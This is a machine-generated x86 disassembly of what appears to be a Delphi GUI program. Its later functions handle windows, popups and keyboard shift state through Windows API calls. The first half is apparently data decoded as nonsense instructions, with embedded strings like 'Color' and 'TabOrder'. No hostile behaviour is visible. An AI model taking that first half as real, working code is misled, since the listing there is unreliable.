mov ah 0xe5
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
inc eax
0xe2bc0045 0x44
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
mov ebp 0x77080045
jae r-xdata
outsd
insb
outsd
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
out 0x45 al
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
clc
in eax 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
xor eax [ eax + eax + 0x18 ]
inc edx
inc edx
outsd
jb r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
sub al 0xe6
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
mov ebx 0x80045
add bh bh
or [ eax ] al
add bh bh
int3
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ eax ] al
je r-xdata
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
push esp
inc esp
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
push [ edi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
dec esp
out 0x45 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
jl r-xdata
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add al cl
jmp 0xffffffffde15beff
jae r-xdata
loop r-xdata
dec esi
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ eax ] al
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebp
add [ eax + 0x45e7 ] dl
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
pushfd
out 0x45 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add al bh
mov ebp 0xc030045
push esp
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
ror [ eax + 0x45be ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov edi 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov edi 0xbf820045
inc ebp
add [ edx + eax ] bl
add [ eax ] al
insb
add [ ebp + edx * 8 + 0x44 ] cl
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ edx + ebp * 4 - 0x43afffbc ] ch
add [ eax - 0x4b ] dl
inc esp
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add ah ch
0xed9c0045 0x45
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
add al bl
aad 0x44
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bh
sub_45c53a
inc ebp
add [ eax + ecx ] al
inc esi
add [ esp + ebp * 4 ] cl
inc esp
add al cl
adc al 0x46
add [ eax ] ch
sbb [ esi ] al
in al 0x16
inc esi
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax + 0x19 ] ah
inc esi
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x540044d7 ] bh
and [ esi ] al
mov ecx gs
inc esp
add ah bh
rol [ eax + eax + 0x68 ] cl
xor eax 0xeaec0046
inc ebp
add [ ebp + ebp * 8 + 0x26480045 ] bl
inc esi
add [ esi + esi * 8 - 0x8ffffbb ] al
inc ebp
add [ eax + 0x39 ] cl
inc esi
add [ ebx + esi * 8 + 0x344c0045 ] bh
inc esi
add [ ebx + ebx ] ch
inc esi
add [ eax ] al
inc esi
add ah ah
add [ esi ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp al 0x2
add [ eax ] al
movsb [ edi ] [ esi ]
rol [ ebp ] 0x50
add al [ eax ]
add al bl
rol [ ebp ] 0x64
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
sub_45ca3c
mov esp 0x88004609
or al 0x46
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
sbb [ edx ] 0x0
jb r-xdata
popad
outsb
add al 0x51
inc edx
add [ eax ] dh
add bh bh
and al 0x71
inc esp
add [ eax + 0x71 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax - 0x23ffbb97 ] cl
inc [ ebp ]
xor al 0xfd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + eax ] cl
inc esi
add [ edi * 8 + 0x45 ] dh
add [ eax - 0x80000000 ] al
sbb al [ eax ]
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
fdiv st7
insb
sbb [ gs : edx ] dh
inc esp
add [ ecx + eax ] ch
inc esp
fadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax + 0x430b001b ] al
insb
add [ eax ] al
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
retn 0x45
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x38ff0001 ] ah
fiadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
in al 0xd8
inc esp
add [ eax ] cl
outsb
je r-xdata
inc ebp
add [ edi * 8 + 0x45 ] dh
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
test [ edi + 0x44 ] ch
add [ edi + ebp * 2 + 0xc880044 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
call 0x5944cb1a
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
int3
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
dec eax
and al 0x44
add [ eax + eax ] dh
[ eax - 0x6c ]
inc esp
add [ ecx ] al
add [ eax ] al
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
dec eax
retn
jb r-xdata
jae r-xdata
add al [ eax ]
inc [ esi + edi + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
push ecx
inc edx
add ah ch
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
fld [ eax + eax ]
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x1b00ffff ] ah
fadd [ eax + eax + 0x8 ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] al
jmp [ eax ]
and al [ eax + eax + 0x5d ]
outsd
outsb
sub_45cc0c
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
cld
and al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_45d654
mov edi 0x7cffbdff
inc eax
inc esi
add [ eax + eax * 2 + 0x413c0046 ] ah
inc esi
add [ ecx + eax * 2 + 0x42680046 ] dl
inc esi
add [ eax + 0x4642 ] al
aas
inc esi
add ah ah
aas
inc esi
add [ eax + 0x40 ] dl
inc esi
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub bh dl
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
add [ eax ] al
add [ eax ] ch
xlat
nop
salc
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
push esp
dec ebp
outsd
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x8004033 ] al
push eax
aad 0x45
add [ eax - 0x39 ] al
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
push esp
adc [ eax ] al
aam 0xf
inc esi
add al ch
cmovbe eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69500d00
js r-xdata
add [ eax + edx + 0x40 ] dl
add ah dl
cmovbe eax [ eax ]
call sub_461ccf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2fffba29 ] dh
xlat
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
xlat
inc ebp
add [ eax + 0x18000000 ] ah
popfd
inc ecx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
fadd [ esi + eax * 2 ]
xor al 0xbd
inc ecx
add [ eax ] ah
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add ah al
cmp eax 0x3f080042
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ ebx + eax * 2 + 0xe0046 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
insb
jae r-xdata
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax ] cl
outsb
arpl [ eax - 0x70 ] bp
sub bh dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x8000408d
xlat
inc ebp
xor eax [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
jb r-xdata
sub_45d810
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al bl
inc ebp
add ah dl
fadd [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x45d8
sub_45d82f
add [ eax + 0x1 ] al
add [ eax ] al
sbb [ ebp + 0x42180041 ] bl
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
push esp
push esi
inc esi
add [ edi * 4 + 0x3e200041 ] dh
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add ah al
cmp eax 0x3f080042
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax + 0x54 ] ch
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
hlt
sub_45d904
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_45d950
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4670f8
mov eax [ rw-data ]
call sub_423d48
mov eax [ rw-data ]
call sub_423cf0
retn
push 0x0
push eax
call ShowOwnedPopups
sub_45d988
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4027b4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_45d9d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_45da7b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45da44
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_45d988
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da82
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_45da8c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4027d4
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_45dac4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45db28
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_45dac4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_45db84
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_45dba4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_45db84
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45dbd0
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_464630
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_464aa0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4081d0
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46461c
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464a8c
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4081d0
test eax eax
je r-xdata
sub_45dc50
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45dca4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45dce0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_45dd2c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45dd8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b8e8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404308
mov eax [ ebp - 0x8 ]
pop edx
call sub_4081d0
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dd91
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_45dd9c
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_45ddc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_45de35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45dd9c
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de3c
lea eax [ ebp - 0xc ]
call sub_404120
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
sub_45de44
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_45ded4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41bc50
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_45e79c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_45e77c
mov edx [ edi + 0xc ]
mov eax ebx
call sub_45e62c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45df24
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45e0dc
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4475f8
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_45e62c
xor edx edx
mov eax ebx
call sub_45e62c
jmp r-xdata
sub_45df5c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42e3c8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45dfc8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42e3c8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45e030
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_45e764
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44a49c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_45e764
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44a460
call sub_45dfc8
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44a460
call sub_45df5c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_45e0dc
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
